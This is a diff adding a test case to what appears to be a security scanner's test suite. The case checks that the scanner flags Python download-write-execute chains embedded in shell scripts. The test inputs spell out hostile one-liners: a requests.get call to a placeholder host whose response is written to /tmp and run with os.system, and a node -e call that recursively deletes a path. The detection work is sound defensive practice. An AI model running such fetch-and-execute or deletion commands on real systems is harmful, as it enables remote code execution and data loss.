@@ -774,6 +774,46 @@ describe("embedded interpreter payloads", () => {
     expect(finding?.innerRange?.startIndex).toBeGreaterThan(0);
   });
 
+  it("scans trusted discovered Python code and requires same-path download execution", () => {
+    const source = `
+      runtime=$(command -v python3)
+      $runtime -c 'import requests, os; response = requests.get("https://example.test/payload"); open("/tmp/payload.sh", "wb").write(response.content); os.system("sh /tmp/payload.sh")'
+    `;
+    const result = scan(source);
+    expect(result.findings).toEqual(expect.arrayContaining([
+      expect.objectContaining({
+        ruleId: "python.network",
+        category: "network_egress",
+        origin: expect.objectContaining({ interpreter: "python", kind: "argument" }),
+      }),
+      expect.objectContaining({
+        ruleId: "python.chain.download-write-execute",
+        category: "download_execution",
+        origin: expect.objectContaining({ interpreter: "python", kind: "argument" }),
+      }),
+    ]));
+
+    const hardNegatives = [
+      `$runtime -c 'import requests, os; r=requests.get("https://example.test/a"); open("/tmp/a", "wb").write(r.content); os.system("sh /tmp/a")'`,
+      `runtime=$(command -v python3); runtime=/tmp/custom; $runtime -c 'import requests, os; r=requests.get("https://example.test/a"); open("/tmp/a", "wb").write(r.content); os.system("sh /tmp/a")'`,
+      `runtime=$(command -v python3); $runtime -c "$PAYLOAD"`,
+      `runtime=$(command -v python3); $runtime -c 'import requests, os; r=requests.get("https://example.test/a"); open("/tmp/a", "wb").write(r.content); os.system("sh /tmp/b")'`,
+      `runtime=$(command -v python3); $runtime -c 'import requests; r=requests.get("https://example.test/a"); open("/tmp/a", "wb").write(r.content)'`,
+      `runtime=$(command -v python3); $runtime -c 'import os; open("/tmp/a", "wb").write(b"x"); os.system("sh /tmp/a")'`,
+    ];
+    for (const negative of hardNegatives) {
+      expect(scan(negative).findings.some((finding) =>
+        finding.ruleId === "python.chain.download-write-execute"
+      )).toBe(false);
+    }
+
+    const allowed = scan(source, { allowedDownloadHosts: ["example.test"] });
+    expect(allowed.findings.some((finding) =>
+      finding.ruleId === "python.chain.download-write-execute"
+    )).toBe(false);
+    expect(allowed.findings.some((finding) => finding.ruleId === "python.network")).toBe(true);
+  });
+
   it("recursively scans node -e and heredocs", () => {
     const argument = scan(`node -e "require('fs').rmSync('/tmp/x', {recursive:true})"`);
     expect(argument.findings.some((item) => item.ruleId === "javascript.destructive")).toBe(true);
